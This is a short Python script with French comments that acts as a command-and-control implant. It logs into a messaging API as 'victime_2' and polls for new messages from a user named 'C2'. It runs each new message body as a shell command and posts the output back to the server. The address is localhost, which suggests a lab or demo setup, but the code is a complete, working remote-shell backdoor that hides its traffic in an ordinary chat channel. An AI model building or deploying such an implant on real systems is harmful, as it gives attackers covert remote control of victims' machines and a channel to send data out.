import requests
import time
import subprocess

USER = "victime_2"
PASSWORD = "testtest"
IP = "127.0.0.1"
PORT = 6000  # le backend Flask écoute ici

find = False

# Auth
response = requests.post(
    f"http://{IP}:{PORT}/api/auth/login",
    json={"username": USER, "password": PASSWORD},
)
response.raise_for_status()
token = response.json()["token"]
headers = {"Authorization": f"Bearer {token}"}

# définir un premier last (placeholder)
last = {'body': 'vide', 'createdAt': '2000-01-22T17:15:13.611397', 'id': 0, 'username': 'C2'}

# --- baseline : on récupère l'id max actuel de C2 avant d'attendre une nouvelle commande ---
resp = requests.get(f"http://{IP}:{PORT}/api/messages", headers=headers)
resp.raise_for_status()
messages = resp.json()
base_id = max((m["id"] for m in messages if m["username"] == "C2"), default=0)
print(f"[baseline] dernier id connu de C2 = {base_id}")

# boucle jusqu'à trouver un message de C2 avec id > base_id
while not find:
    resp = requests.get(f"http://{IP}:{PORT}/api/messages", headers=headers)
    resp.raise_for_status()
    for message in resp.json():
        body = message["body"]
        username = message["username"]
        mid = message["id"]

        # si message venant de C2 et id strictement supérieur à la baseline
        if username == "C2" and mid > base_id:
            last = message.copy()
            print("coucou — nouveau message trouvé :", last)
            find = True
            break

    if not find:
        print("fin (rien de nouveau), attente 2s...")
        time.sleep(2)

# Exécution de la commande récupérée
try:
    result = subprocess.run(
        last['body'],                      # la commande
        shell=True,
        text=True,
        timeout=60,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,  # fusionne stderr -> stdout
    )
    retour = result.stdout
except Exception as e:
    retour = f"[ERREUR EXEC] {e}"

print("Sortie de la commande:\n", retour)

# Envoi du résultat au serveur
response = requests.post(
    f"http://{IP}:{PORT}/api/messages",
    headers=headers,
    json={"body": retour},
)
response.raise_for_status()
print("Résultat envoyé.")
